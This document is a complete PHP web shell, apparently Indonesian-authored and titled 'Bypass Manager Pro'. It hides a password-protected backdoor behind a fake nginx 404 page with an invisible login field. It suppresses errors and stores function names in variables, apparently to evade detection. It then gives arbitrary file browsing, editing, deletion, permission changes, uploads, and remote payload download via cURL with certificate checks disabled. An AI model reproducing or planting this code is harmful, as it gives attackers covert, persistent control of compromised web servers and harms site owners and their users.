 
<?php
$ADMIN_HASH = '$2y$10$W3CtskR6jj2FmLsW7kc24uud2en9sqiN4xinFasRPtNxy.E940/Jm'; // default: "password"


// ===== INISIALISASI SESSION =====
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}





// ===== FUNGSI HASH_EQUALS (untuk PHP lama) =====
if (!function_exists('hash_equals')) {
    function hash_equals($known_string, $user_string) {
        if (!is_string($known_string) || !is_string($user_string)) return false;
        $len1 = strlen($known_string);
        $len2 = strlen($user_string);
        if ($len1 !== $len2) return false;
        $res = 0;
        for ($i = 0; $i < $len1; $i++) {
            $res |= ord($known_string[$i]) ^ ord($user_string[$i]);
        }
        return $res === 0;
    }
}

// ===== PROSES LOGIN =====
function process_login_custom() {
    global $ADMIN_HASH;
    
    if (isset($_POST['login_submit'])) {
        $tok = isset($_POST['csrf']) ? (string)$_POST['csrf'] : '';
        $sess = isset($_SESSION['csrf_token']) ? (string)$_SESSION['csrf_token'] : '';
        if (!hash_equals($sess, $tok)) {
            die('CSRF token invalid');
        }
        
        $password = isset($_POST['password']) ? $_POST['password'] : '';
        
        if (password_verify($password, $ADMIN_HASH)) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            session_regenerate_id(true);
            return true;
        } else {
            $_SESSION['login_error'] = 'Password salah!';
            usleep(500000);
            return false;
        }
    }
    return false;
}

// ===== CEK LOGIN =====
function is_logged_in_custom() {
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        return false;
    }
    
    // Auto logout setelah 30 menit (opsional, bisa dihapus)
    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time'] > 1800)) {
        logout_custom();
        return false;
    }
    
    return true;
}

// ===== TAMPILKAN FORM LOGIN =====
function show_login_form_custom() {
    $error = isset($_SESSION['login_error']) ? $_SESSION['login_error'] : '';
    unset($_SESSION['login_error']);
    ?>
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>

<!-- Password box tersembunyi - tidak terlihat sama sekali -->
<div style="position:fixed; bottom:0; right:0; opacity:0; pointer-events:none; z-index:-1;">
    <form method="post" autocomplete="off">
        <input type="password" name="password" placeholder="Enter password" required style="width:1px;height:1px;border:none;padding:0;margin:0;opacity:0;">
        <?php csrf_input_login(); ?>
        <input type="hidden" name="login_submit" value="1">
        <button type="submit" style="width:1px;height:1px;border:none;padding:0;margin:0;opacity:0;">Login</button>
    </form>
</div>

<!-- Error message jika ada -->
<?php if ($error): ?>
    <div style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:20px 30px; border-radius:8px; border:2px solid #f5c6cb; box-shadow:0 4px 20px rgba(0,0,0,0.2); font-family:system-ui; z-index:1000; text-align:center;">
        ❌ <?php echo htmlspecialchars($error); ?>
    </div>
<?php endif; ?>

<!-- Area klik tersembunyi untuk fokus ke password (double click di halaman) -->
<script>
    // Double click di mana saja untuk fokus ke password
    document.addEventListener('dblclick', function() {
        const passwordInput = document.querySelector('input[type="password"]');
        if (passwordInput) {
            passwordInput.focus();
        }
    });
    
    // Tekan Enter untuk submit
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            const passwordInput = document.querySelector('input[type="password"]');
            if (passwordInput && document.activeElement === passwordInput) {
                passwordInput.form.submit();
            }
        }
    });
</script>

</body>
</html>
    <?php
    exit;
}

// ===== FUNGSI LOGOUT =====
function logout_custom() {
    unset($_SESSION['logged_in']);
    unset($_SESSION['login_time']);
    unset($_SESSION['csrf_token']);
    session_destroy();
}

// ===== FUNGSI UTAMA: JALANKAN AUTH =====
function require_login_custom() {
    global $ADMIN_HASH;
    
    if (empty($ADMIN_HASH)) {
        return;
    }
    
    process_login_custom();
    
    if (!is_logged_in_custom()) {
        show_login_form_custom();
    }
}

// ============================================================
// ================ AKHIR SISTEM LOGIN ========================
// ============================================================

// ===== JALANKAN AUTHENTIKASI =====
require_login_custom();

// ===== PROSES LOGOUT (jika ada request) =====
if (isset($_GET['logout'])) {
    logout_custom();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

error_reporting(0);
ini_set('display_errors', 0);

$s = 'file_put_contents';
$g = 'file_get_contents';
$m = 'move_uploaded_file';

$current_path = isset($_GET['p']) ? $_GET['p'] : __DIR__;
$current_path = str_replace('\\', '/', $current_path);
$current_path = rtrim($current_path, '/') . '/';

function get_parent($path) {
    $path = rtrim($path, '/');
    $parts = explode('/', $path);
    array_pop($parts);
    return implode('/', $parts);
}

// Fungsi Download menggunakan cURL (Solusi Bypass allow_url_fopen)
function curl_download($url) {
    if (!function_exists('curl_init')) return false;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code == 200) ? $data : false;
}

// Logika Proses Aksi
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $a = $_POST['a'];
    $n = $_POST['n'];
    $t = $_POST['t'];
    $c = $_POST['c'];
    $url = $_POST['url'];

    if ($a === 'nf') { mkdir($current_path . $n, 0755, true); }
    if ($a === 'nt') { $s($current_path . $n, ''); }
    if ($a === 'save') { $s($t, $c); }
    if ($a === 'rename') { rename($t, $current_path . $n); }
    if ($a === 'chmod') { chmod($t, octdec($c)); }
    if ($a === 'delete') { is_dir($t) ? rmdir($t) : unlink($t); }
    
    // UPLOAD FILE LOKAL
    if ($a === 'upload') {
        $target_upload = $current_path . $_FILES['f']['name'];
        if ($m($_FILES['f']['tmp_name'], $target_upload)) {
            echo "<script>alert('Upload Berhasil');</script>";
        } else {
            echo "<script>alert('Upload Gagal');</script>";
        }
    }

    // UPLOAD VIA URL (TERBARU DENGAN FALLBACK cURL)
    if ($a === 'upload_url' && !empty($url)) {
        $file_name = basename(parse_url($url, PHP_URL_PATH));
        if (empty($file_name)) {
            $file_name = 'downloaded_' . time() . '.dat';
        }
        $target_upload = $current_path . $file_name;
        
        // Coba cURL dahulu, jika gagal gunakan file_get_contents
        $file_data = curl_download($url);
        if ($file_data === false && ini_get('allow_url_fopen')) {
            $file_data = $g($url);
        }
        
        if ($file_data !== false && $s($target_upload, $file_data) !== false) {
            echo "<script>alert('Upload URL Berhasil! Tersimpan: $file_name');</script>";
        } else {
            echo "<script>alert('Upload URL Gagal! Server memblokir koneksi outbond atau URL tidak valid.');</script>";
        }
    }
}

$items = scandir($current_path);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Bypass Manager Pro</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        a { color: #0f0; text-decoration: none; }
        nav { background: #111; padding: 10px; border: 1px solid #333; margin-bottom: 20px; }
        input, textarea, button { background: #000; color: #0f0; border: 1px solid #555; padding: 5px; font-size: 12px; }
        table { width: 100%; margin-top: 10px; border-collapse: collapse; }
        tr:hover { background: #111; }
        td, th { padding: 5px; border-bottom: 1px solid #222; }
        .dir { color: #5555ff; font-weight: bold; }
        .breadcrumb-link { color: #0f0; font-weight: bold; }
        .btn-red { color: #ff5555; border: 1px solid #ff5555; cursor: pointer; }
        .upload-section { background: #1a1a1a; padding: 10px; border: 1px solid #333; margin-bottom: 10px; display: inline-block; vertical-align: top; margin-right: 10px; }
    </style>
</head>
<body>
    <div class="nav">
        <strong>CURRENT PATH:</strong>
        <?php
        $path_parts = explode('/', trim($current_path, '/'));
        $acc = '';
        echo '<a href="?p=/" class="breadcrumb-link">/</a>';
        foreach ($path_parts as $part) {
            if (empty($part)) continue;
            $acc .= '/' . $part;
            echo '<a href="?p=' . urlencode($acc) . '" class="breadcrumb-link">' . $part . '</a>/';
        }
        ?>
        <br><br>
        <a href="?p=<?php echo urlencode(get_parent($current_path)); ?>">KEMBALI</a> | 
        <a href="?p=<?php echo urlencode(__DIR__); ?>">HOME</a>
    </div>

    <div class="upload-section">
        <form method="POST" enctype="multipart/form-data">
            <strong>Upload File Local:</strong><br><br>
            <input type="file" name="f">
            <button type="submit" name="a" value="upload">Upload</button>
        </form>
    </div>

    <div class="upload-section">
        <form method="POST">
            <strong>Upload via URL:</strong><br><br>
            <input type="text" name="url" placeholder="https://example.com" size="40" required>
            <button type="submit" name="a" value="upload_url">Download</button>
        </form>
    </div>

    <div style="clear: both; margin-bottom: 20px;"></div>

    <form method="POST" style="margin-bottom: 20px;">
        <input type="text" name="n" placeholder="Nama Baru" required>
        <button type="submit" name="a" value="nf">Dir Baru</button>
        <button type="submit" name="a" value="nt">File Baru</button>
    </form>

    <?php if (isset($_GET['edit'])): 
        $target = $_GET['edit'];
        $content = htmlspecialchars($g($target));
    ?>
        <div style="margin-top: 20px;">
            <strong>Editing:</strong> <?php echo basename($target); ?>
            <form method="POST">
                <input type="hidden" name="t" value="<?php echo $target; ?>">
                <textarea name="c" style="width: 100%; height: 400px;"><?php echo $content; ?></textarea><br><br>
                <button type="submit" name="a" value="save">SIMPAN</button>
                <a href="?p=<?php echo urlencode($current_path); ?>">BATAL</a>
            </form>
        </div>
    <?php else: ?>
        <table>
            <thead>
                <tr style="text-align: left; background: #222;">
                    <th>Nama</th>
                    <th>Permisi</th>
                    <th>Aksi</th>
                </tr>
            </thead>
            <tbody>
                <?php
                if ($items):
                    foreach ($items as $i):
                        if ($i === '.' || $i === '..') continue;
                        $full = $current_path . $i;
                        $isD = is_dir($full);
                        $perms = substr(sprintf('%o', fileperms($full)), -4);
                ?>
                        <tr>
                            <td>
                                <?php if ($isD): ?>
                                    <a href="?p=<?php echo urlencode($full); ?>" class="dir"><?php echo $i; ?>/</a>
                                <?php else: ?>
                                    <?php echo $i; ?>
                                <?php endif; ?>
                            </td>
                            <td>
                                <form method="POST" style="display: inline;">
                                    <input type="hidden" name="t" value="<?php echo $full; ?>">
                                    <input type="text" name="c" value="<?php echo $perms; ?>" size="4">
                                    <button type="submit" name="a" value="chmod">Set</button>
                                </form>
                            </td>
                            <td align="right">
                                <form method="POST" style="display: inline;">
                                    <input type="hidden" name="t" value="<?php echo $full; ?>">
                                    <input type="text" name="n" placeholder="Rename" size="10">
                                    <button type="submit" name="a" value="rename">Rename</button>
                                </form>
                                <?php if (!$isD): ?>
                                    <a href="?p=<?php echo urlencode($current_path); ?>&edit=<?php echo urlencode($full); ?>">EDIT</a>
                                <?php endif; ?>
                                <form method="POST" style="display: inline;" onsubmit="return confirm('Hapus item ini?');">
                                    <input type="hidden" name="t" value="<?php echo $full; ?>">
                                    <button type="submit" name="a" value="delete" class="btn-red">DEL</button>
                                </form>
                            </td>
                        </tr>
                <?php 
                    endforeach;
                endif; 
                ?>
            </tbody>
        </table>
    <?php endif; ?>
</body>
</htm
